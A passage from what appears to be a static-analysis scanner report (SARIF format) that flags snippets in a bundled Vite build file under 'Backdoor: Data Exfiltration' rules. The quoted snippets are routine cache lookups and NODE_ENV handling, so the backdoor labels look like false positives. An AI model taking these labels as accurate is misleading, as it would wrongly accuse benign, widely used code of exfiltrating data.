                      "text": "                break;\n            }\n        }\n        const cached = this.#resolvePosixCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n",
                      "markdown": "`                break;\n            }\n        }\n        const cached = this.#resolvePosixCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 8875,
                  "startColumn": 41,
                  "endLine": 8875,
                  "endColumn": 46,
                  "snippet": {
                    "text": "                break;\n            }\n        }\n        const cached = this.#resolveCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n",
                    "rendered": {
                      "text": "                break;\n            }\n        }\n        const cached = this.#resolveCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n",
                      "markdown": "`                break;\n            }\n        }\n        const cached = this.#resolveCache.get(r);\n        if (cached !== undefined) {\n            return cached;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 7853,
                  "startColumn": 37,
                  "endLine": 7853,
                  "endColumn": 42,
                  "snippet": {
                    "text": "     * @internal\n     */\n    children() {\n        const cached = this.#children.get(this);\n        if (cached) {\n            return cached;\n        }\n",
                    "rendered": {
                      "text": "     * @internal\n     */\n    children() {\n        const cached = this.#children.get(this);\n        if (cached) {\n            return cached;\n        }\n",
                      "markdown": "`     * @internal\n     */\n    children() {\n        const cached = this.#children.get(this);\n        if (cached) {\n            return cached;\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 7585,
                  "startColumn": 34,
                  "endLine": 7585,
                  "endColumn": 39,
                  "snippet": {
                    "text": "};\nconst normalizeNocaseCache = new Map();\nconst normalizeNocase = (s) => {\n    const c = normalizeNocaseCache.get(s);\n    if (c)\n        return c;\n    const n = normalize(s.toLowerCase());\n",
                    "rendered": {
                      "text": "};\nconst normalizeNocaseCache = new Map();\nconst normalizeNocase = (s) => {\n    const c = normalizeNocaseCache.get(s);\n    if (c)\n        return c;\n    const n = normalize(s.toLowerCase());\n",
                      "markdown": "`};\nconst normalizeNocaseCache = new Map();\nconst normalizeNocase = (s) => {\n    const c = normalizeNocaseCache.get(s);\n    if (c)\n        return c;\n    const n = normalize(s.toLowerCase());\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 7576,
                  "startColumn": 28,
                  "endLine": 7576,
                  "endColumn": 33,
                  "snippet": {
                    "text": "// normalize unicode path names\nconst normalizeCache = new Map();\nconst normalize = (s) => {\n    const c = normalizeCache.get(s);\n    if (c)\n        return c;\n    const n = s.normalize('NFKD');\n",
                    "rendered": {
                      "text": "// normalize unicode path names\nconst normalizeCache = new Map();\nconst normalize = (s) => {\n    const c = normalizeCache.get(s);\n    if (c)\n        return c;\n    const n = s.normalize('NFKD');\n",
                      "markdown": "`// normalize unicode path names\nconst normalizeCache = new Map();\nconst normalize = (s) => {\n    const c = normalizeCache.get(s);\n    if (c)\n        return c;\n    const n = s.normalize('NFKD');\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6397,
                  "startColumn": 38,
                  "endLine": 6397,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    #delete(k, reason) {\n        let deleted = false;\n        if (this.#size !== 0) {\n            const index = this.#keyMap.get(k);\n            if (index !== undefined) {\n                deleted = true;\n                if (this.#size === 1) {\n",
                    "rendered": {
                      "text": "    #delete(k, reason) {\n        let deleted = false;\n        if (this.#size !== 0) {\n            const index = this.#keyMap.get(k);\n            if (index !== undefined) {\n                deleted = true;\n                if (this.#size === 1) {\n",
                      "markdown": "`    #delete(k, reason) {\n        let deleted = false;\n        if (this.#size !== 0) {\n            const index = this.#keyMap.get(k);\n            if (index !== undefined) {\n                deleted = true;\n                if (this.#size === 1) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6313,
                  "startColumn": 34,
                  "endLine": 6313,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     */\n    get(k, getOptions = {}) {\n        const { allowStale = this.allowStale, updateAgeOnGet = this.updateAgeOnGet, noDeleteOnStaleGet = this.noDeleteOnStaleGet, status, } = getOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const value = this.#valList[index];\n            const fetching = this.#isBackgroundFetch(value);\n",
                    "rendered": {
                      "text": "     */\n    get(k, getOptions = {}) {\n        const { allowStale = this.allowStale, updateAgeOnGet = this.updateAgeOnGet, noDeleteOnStaleGet = this.noDeleteOnStaleGet, status, } = getOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const value = this.#valList[index];\n            const fetching = this.#isBackgroundFetch(value);\n",
                      "markdown": "`     */\n    get(k, getOptions = {}) {\n        const { allowStale = this.allowStale, updateAgeOnGet = this.updateAgeOnGet, noDeleteOnStaleGet = this.noDeleteOnStaleGet, status, } = getOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const value = this.#valList[index];\n            const fetching = this.#isBackgroundFetch(value);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6295,
                  "startColumn": 22,
                  "endLine": 6295,
                  "endColumn": 27,
                  "snippet": {
                    "text": "            throw new Error('no memoMethod provided to constructor');\n        }\n        const { context, forceRefresh, ...options } = memoOptions;\n        const v = this.get(k, options);\n        if (!forceRefresh && v !== undefined)\n            return v;\n        const vv = memoMethod(k, v, {\n",
                    "rendered": {
                      "text": "            throw new Error('no memoMethod provided to constructor');\n        }\n        const { context, forceRefresh, ...options } = memoOptions;\n        const v = this.get(k, options);\n        if (!forceRefresh && v !== undefined)\n            return v;\n        const vv = memoMethod(k, v, {\n",
                      "markdown": "`            throw new Error('no memoMethod provided to constructor');\n        }\n        const { context, forceRefresh, ...options } = memoOptions;\n        const v = this.get(k, options);\n        if (!forceRefresh && v !== undefined)\n            return v;\n        const vv = memoMethod(k, v, {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6237,
                  "startColumn": 32,
                  "endLine": 6237,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            status,\n            signal,\n        };\n        let index = this.#keyMap.get(k);\n        if (index === undefined) {\n            if (status)\n                status.fetch = 'miss';\n",
                    "rendered": {
                      "text": "            status,\n            signal,\n        };\n        let index = this.#keyMap.get(k);\n        if (index === undefined) {\n            if (status)\n                status.fetch = 'miss';\n",
                      "markdown": "`            status,\n            signal,\n        };\n        let index = this.#keyMap.get(k);\n        if (index === undefined) {\n            if (status)\n                status.fetch = 'miss';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6214,
                  "startColumn": 23,
                  "endLine": 6214,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        if (!this.#hasFetchMethod) {\n            if (status)\n                status.fetch = 'get';\n            return this.get(k, {\n                allowStale,\n                updateAgeOnGet,\n                noDeleteOnStaleGet,\n",
                    "rendered": {
                      "text": "        if (!this.#hasFetchMethod) {\n            if (status)\n                status.fetch = 'get';\n            return this.get(k, {\n                allowStale,\n                updateAgeOnGet,\n                noDeleteOnStaleGet,\n",
                      "markdown": "`        if (!this.#hasFetchMethod) {\n            if (status)\n                status.fetch = 'get';\n            return this.get(k, {\n                allowStale,\n                updateAgeOnGet,\n                noDeleteOnStaleGet,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6187,
                  "startColumn": 32,
                  "endLine": 6187,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        if (index === undefined) {\n            // internal, don't expose status.\n            this.set(k, bf, { ...fetchOpts.options, status: undefined });\n            index = this.#keyMap.get(k);\n        }\n        else {\n            this.#valList[index] = bf;\n",
                    "rendered": {
                      "text": "        if (index === undefined) {\n            // internal, don't expose status.\n            this.set(k, bf, { ...fetchOpts.options, status: undefined });\n            index = this.#keyMap.get(k);\n        }\n        else {\n            this.#valList[index] = bf;\n",
                      "markdown": "`        if (index === undefined) {\n            // internal, don't expose status.\n            this.set(k, bf, { ...fetchOpts.options, status: undefined });\n            index = this.#keyMap.get(k);\n        }\n        else {\n            this.#valList[index] = bf;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6058,
                  "startColumn": 34,
                  "endLine": 6058,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     */\n    peek(k, peekOptions = {}) {\n        const { allowStale = this.allowStale } = peekOptions;\n        const index = this.#keyMap.get(k);\n        if (index === undefined ||\n            (!allowStale && this.#isStale(index))) {\n            return;\n",
                    "rendered": {
                      "text": "     */\n    peek(k, peekOptions = {}) {\n        const { allowStale = this.allowStale } = peekOptions;\n        const index = this.#keyMap.get(k);\n        if (index === undefined ||\n            (!allowStale && this.#isStale(index))) {\n            return;\n",
                      "markdown": "`     */\n    peek(k, peekOptions = {}) {\n        const { allowStale = this.allowStale } = peekOptions;\n        const index = this.#keyMap.get(k);\n        if (index === undefined ||\n            (!allowStale && this.#isStale(index))) {\n            return;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6022,
                  "startColumn": 34,
                  "endLine": 6022,
                  "endColumn": 39,
                  "snippet": {
                    "text": "     */\n    has(k, hasOptions = {}) {\n        const { updateAgeOnHas = this.updateAgeOnHas, status } = hasOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const v = this.#valList[index];\n            if (this.#isBackgroundFetch(v) &&\n",
                    "rendered": {
                      "text": "     */\n    has(k, hasOptions = {}) {\n        const { updateAgeOnHas = this.updateAgeOnHas, status } = hasOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const v = this.#valList[index];\n            if (this.#isBackgroundFetch(v) &&\n",
                      "markdown": "`     */\n    has(k, hasOptions = {}) {\n        const { updateAgeOnHas = this.updateAgeOnHas, status } = hasOptions;\n        const index = this.#keyMap.get(k);\n        if (index !== undefined) {\n            const v = this.#valList[index];\n            if (this.#isBackgroundFetch(v) &&\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5860,
                  "startColumn": 63,
                  "endLine": 5860,
                  "endColumn": 68,
                  "snippet": {
                    "text": "            this.#delete(k, 'set');\n            return this;\n        }\n        let index = this.#size === 0 ? undefined : this.#keyMap.get(k);\n        if (index === undefined) {\n            // addition\n            index = (this.#size === 0\n",
                    "rendered": {
                      "text": "            this.#delete(k, 'set');\n            return this;\n        }\n        let index = this.#size === 0 ? undefined : this.#keyMap.get(k);\n        if (index === undefined) {\n            // addition\n            index = (this.#size === 0\n",
                      "markdown": "`            this.#delete(k, 'set');\n            return this;\n        }\n        let index = this.#size === 0 ? undefined : this.#keyMap.get(k);\n        if (index === undefined) {\n            // addition\n            index = (this.#size === 0\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5724,
                  "startColumn": 30,
                  "endLine": 5724,
                  "endColumn": 35,
                  "snippet": {
                    "text": "     * if relevant.\n     */\n    info(key) {\n        const i = this.#keyMap.get(key);\n        if (i === undefined)\n            return undefined;\n        const v = this.#valList[i];\n",
                    "rendered": {
                      "text": "     * if relevant.\n     */\n    info(key) {\n        const i = this.#keyMap.get(key);\n        if (i === undefined)\n            return undefined;\n        const v = this.#valList[i];\n",
                      "markdown": "`     * if relevant.\n     */\n    info(key) {\n        const i = this.#keyMap.get(key);\n        if (i === undefined)\n            return undefined;\n        const v = this.#valList[i];\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5656,
                  "startColumn": 27,
                  "endLine": 5656,
                  "endColumn": 32,
                  "snippet": {
                    "text": "            if (value === undefined)\n                continue;\n            if (fn(value, this.#keyList[i], this)) {\n                return this.get(this.#keyList[i], getOptions);\n            }\n        }\n    }\n",
                    "rendered": {
                      "text": "            if (value === undefined)\n                continue;\n            if (fn(value, this.#keyList[i], this)) {\n                return this.get(this.#keyList[i], getOptions);\n            }\n        }\n    }\n",
                      "markdown": "`            if (value === undefined)\n                continue;\n            if (fn(value, this.#keyList[i], this)) {\n                return this.get(this.#keyList[i], getOptions);\n            }\n        }\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5544,
                  "startColumn": 24,
                  "endLine": 5544,
                  "endColumn": 29,
                  "snippet": {
                    "text": "    }\n    #isValidIndex(index) {\n        return (index !== undefined &&\n            this.#keyMap.get(this.#keyList[index]) === index);\n    }\n    /**\n     * Return a generator yielding `[key, value]` pairs,\n",
                    "rendered": {
                      "text": "    }\n    #isValidIndex(index) {\n        return (index !== undefined &&\n            this.#keyMap.get(this.#keyList[index]) === index);\n    }\n    /**\n     * Return a generator yielding `[key, value]` pairs,\n",
                      "markdown": "`    }\n    #isValidIndex(index) {\n        return (index !== undefined &&\n            this.#keyMap.get(this.#keyList[index]) === index);\n    }\n    /**\n     * Return a generator yielding `[key, value]` pairs,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 5427,
                  "startColumn": 38,
                  "endLine": 5427,
                  "endColumn": 43,
                  "snippet": {
                    "text": "            return n;\n        };\n        this.getRemainingTTL = key => {\n            const index = this.#keyMap.get(key);\n            if (index === undefined) {\n                return 0;\n            }\n",
                    "rendered": {
                      "text": "            return n;\n        };\n        this.getRemainingTTL = key => {\n            const index = this.#keyMap.get(key);\n            if (index === undefined) {\n                return 0;\n            }\n",
                      "markdown": "`            return n;\n        };\n        this.getRemainingTTL = key => {\n            const index = this.#keyMap.get(key);\n            if (index === undefined) {\n                return 0;\n            }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66109,
                  "startColumn": 23,
                  "endLine": 66109,
                  "endColumn": 34,
                  "snippet": {
                    "text": "      );\n    }\n  }\n  const isProduction = process.env.NODE_ENV === \"production\";\n  const isBuild = command === \"build\";\n  const relativeBaseShortcut = config.base === \"\" || config.base === \"./\";\n  const resolvedBase = relativeBaseShortcut ? !isBuild || config.build?.ssr ? \"/\" : \"./\" : resolveBaseUrl(config.base, isBuild, logger) ?? \"/\";\n",
                    "rendered": {
                      "text": "      );\n    }\n  }\n  const isProduction = process.env.NODE_ENV === \"production\";\n  const isBuild = command === \"build\";\n  const relativeBaseShortcut = config.base === \"\" || config.base === \"./\";\n  const resolvedBase = relativeBaseShortcut ? !isBuild || config.build?.ssr ? \"/\" : \"./\" : resolveBaseUrl(config.base, isBuild, logger) ?? \"/\";\n",
                      "markdown": "`      );\n    }\n  }\n  const isProduction = process.env.NODE_ENV === \"production\";\n  const isBuild = command === \"build\";\n  const relativeBaseShortcut = config.base === \"\" || config.base === \"./\";\n  const resolvedBase = relativeBaseShortcut ? !isBuild || config.build?.ssr ? \"/\" : \"./\" : resolveBaseUrl(config.base, isBuild, logger) ?? \"/\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66105,
                  "startColumn": 173,
                  "endLine": 66105,
                  "endColumn": 184,
                  "snippet": {
                    "text": "      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n      );\n    }\n  }\n",
                    "rendered": {
                      "text": "      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n      );\n    }\n  }\n",
                      "markdown": "`      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n      );\n    }\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66102,
                  "startColumn": 6,
                  "endLine": 66102,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n",
                    "rendered": {
                      "text": "  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n",
                      "markdown": "`  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n    } else {\n      logger.warn(\n        `NODE_ENV=${userNodeEnv} is not supported in the .env file. Only NODE_ENV=development is supported to create a development build of your project. If you need to set process.env.NODE_ENV, you can set it in the Vite config instead.`\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66099,
                  "startColumn": 22,
                  "endLine": 66099,
                  "endColumn": 33,
                  "snippet": {
                    "text": "  }\n  const envDir = config.envDir ? normalizePath$3(path$n.resolve(resolvedRoot, config.envDir)) : resolvedRoot;\n  const userEnv = inlineConfig.envFile !== false && loadEnv(mode, envDir, resolveEnvPrefix(config));\n  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n",
                    "rendered": {
                      "text": "  }\n  const envDir = config.envDir ? normalizePath$3(path$n.resolve(resolvedRoot, config.envDir)) : resolvedRoot;\n  const userEnv = inlineConfig.envFile !== false && loadEnv(mode, envDir, resolveEnvPrefix(config));\n  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n",
                      "markdown": "`  }\n  const envDir = config.envDir ? normalizePath$3(path$n.resolve(resolvedRoot, config.envDir)) : resolvedRoot;\n  const userEnv = inlineConfig.envFile !== false && loadEnv(mode, envDir, resolveEnvPrefix(config));\n  const userNodeEnv = process.env.VITE_USER_NODE_ENV;\n  if (!isNodeEnvSet && userNodeEnv) {\n    if (userNodeEnv === \"development\") {\n      process.env.NODE_ENV = \"development\";\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66018,
                  "startColumn": 4,
                  "endLine": 66018,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n  }\n  const configEnv = {\n    mode,\n",
                    "rendered": {
                      "text": "  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n  }\n  const configEnv = {\n    mode,\n",
                      "markdown": "`  const isNodeEnvSet = !!process.env.NODE_ENV;\n  const packageCache = /* @__PURE__ */ new Map();\n  if (!isNodeEnvSet) {\n    process.env.NODE_ENV = defaultNodeEnv;\n  }\n  const configEnv = {\n    mode,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66015,
                  "startColumn": 25,
                  "endLine": 66015,
                  "endColumn": 36,
                  "snippet": {
